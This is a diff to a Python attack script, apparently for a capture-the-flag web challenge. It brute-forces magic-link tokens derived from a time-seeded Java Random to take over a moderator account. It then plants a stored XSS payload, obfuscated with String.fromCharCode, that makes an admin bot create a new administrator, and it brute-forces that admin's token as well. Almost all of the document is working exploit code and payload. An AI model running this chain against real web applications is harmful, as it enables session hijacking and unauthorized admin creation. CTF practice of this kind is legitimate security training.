@@ -10,6 +10,8 @@ import time
 from javarandom import Random   # 来自 MostAwesomeDude/java-random 仓库
 import requests
 import urllib.parse
+import random
+from bs4 import BeautifulSoup
 
 # 源代码中的Random类实现方法，由于Random不安全，在同一个时间Random 实例在同一毫秒内被创建时，
 # 默认种子就是当前时间戳,同一个种子生成得随机数是一样的，那么就能爆破出token, 只要我们知道了token生成过程
@@ -40,7 +42,7 @@ def create_token_using_java_random_pkg(seed:str, user_id: int):
     return base64.urlsafe_b64encode(encbytes).decode('ascii').rstrip('=')
 
 # 暴力列出来2秒内所有的seed可以得到的token
-def brute_all_tokens(user_id: int, center_ms: int = None, radius_ms: int = 2_000):
+def brute_all_tokens(user_id: int, center_ms: int = None, radius_ms: int = 1_000):
     """把 center_ms ± radius_ms 内所有 token 全算出来"""
     if center_ms is None:
         center_ms = int(time.time() * 1000)
@@ -84,39 +86,78 @@ def consume_magic_link(session: requests.Session, base_url: str, token: str):
 # 很奇怪name:String.fromCharCode(98)会被拦截
 # 这个可以
 # a<script>fetch(String.fromCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:88,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
-def generate_xss_payload(session: requests.Session, base_url: str):
+def generate_xss_payload(session: requests.Session, base_url: str, new_admin:str):
     """
     POST /question 使用cookie的moderator权限用户发送帖子
     """
     payload = r"""
-    a<script>fetch(String.fromdCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:88,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
-    """ 
+        a<script>fetch(String.fromCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:%s,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
+        """.strip() % new_admin
     url = urllib.parse.urljoin(base_url, XSS_PATH)
-    # @ TODO 没写完
-    # data = {"username": username}
-    # resp = session.post(url, data=data, allow_redirects=False)
-    return resp.status_code, resp.text
+    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {"title": "zzzzz", "description": f"{payload}", "category": "1"}
+    resp = session.post(url, data=data, headers=headers, allow_redirects=False)
+    return resp.status_code
+
+def find_users(session: requests.Session, base_url: str, username: str):
+    # 尝试捕捉创建的用户的user number是多少，后续用于继续爆破token
+    for user_number in range(2,20):
+        url = urllib.parse.urljoin(base_url, f'/profile/{user_number}')
+        resp_content = session.get(url, allow_redirects=False).text
+        soup = BeautifulSoup(resp_content, "html.parser")
+        # 找到 <h2>创建的用户名</h2>
+        user = soup.find("h2")
+        if user and user.text == username:
+            print(f"找到用户 {username}")
+        return user_number
+    print("本次循环未找到创建admin用户")
+    return None
+
+# 爆破token得到用户cookie的过程
+def brute_for_user_access(base_url:str, username:str, uid:str, s:requests.Session):
+    code, text = send_generate_magic_link(s, base_url, username)
+    print("POST /generateMagicLink ->", code, text[:100])
+    # 得到2 秒内所有可能token清单
+    pairs = brute_all_tokens(uid)
+    cookie = None
+    # 逐个尝试 token
+    print(f"正在尝试爆破当前用户{username} uid为{uid}得请求token") # 发送token申请
+    for seed, tok in pairs:
+        cookie = consume_magic_link(s, base_url, tok)
+        if cookie:
+            print("成功爆破出token，捕获cookie:", cookie)
+            break
+    if not cookie:
+        print("没有成功捕获token，请排除错误")
+        s.close()
 
 if __name__ == "__main__":
-    base_url = "http://192.168.179.234:8888/"
+    base_url = "http://192.168.129.235:8888/"
     username = "Carl"
-    uid = 5
+    uid = 5 #有moderator权限的
 
     with requests.Session() as s:
-        # 首先触发后端生成 token
-        code, text = send_generate_magic_link(s, base_url, username)
-        print("POST /generateMagicLink ->", code, text[:100])
-
-        # 得到2 秒内所有可能token清单
-        pairs = brute_all_tokens(uid)
-        cookie = None
-        # 逐个尝试 token
-        print(f"正在尝试爆破当前用户{username} uid为{uid}得请求token") # 发送token申请
-        for seed, tok in pairs:
-            cookie = consume_magic_link(s, base_url, tok)
-            if cookie:
-                print("成功爆破出token，捕获cookie:", cookie)
-                break
-
-        if not cookie:
-            print("没有成功捕获token，请排除错误")
+        # 首先触发后端生成 token,如果成功会更新session,获取编辑权限用户
+        brute_for_user_access(base_url, username, uid, s)
+        # 用编辑权限用户发XSS payload
+        admin_username = f"{random.randint(100, 1000)}" # 数字当用户名，邮箱必填没有过滤随意的值就可以
+        status_code = generate_xss_payload(s, base_url, admin_username)
+        if status_code == 200:
+            print(f"XSS已发送到question路径，等待admin点击创建用户{username}，尝试获取admin是否创建成功")
+            # 暂停 10 秒
+            print("请等待10s，需要后台bot进行点击")
+            time.sleep(10)
+            print("10 秒后尝试寻找用户是否创建")
+            user_num = find_users(s, base_url, admin_username)
+            if user_num:
+                print(f"成功找到创建的用户，id为{user_num},进行创建admin用户token爆破")
+                brute_for_user_access(base_url, admin_username, user_num, s)
+                print("获取第一个flag")
+                #@TODO 没写完
+                s.close()
+            else:
+                print(f"管理员可能未点击XSS payload")
+                s.close()
+        else:
+            print("XSS Payload发送失败")
+            s.close()
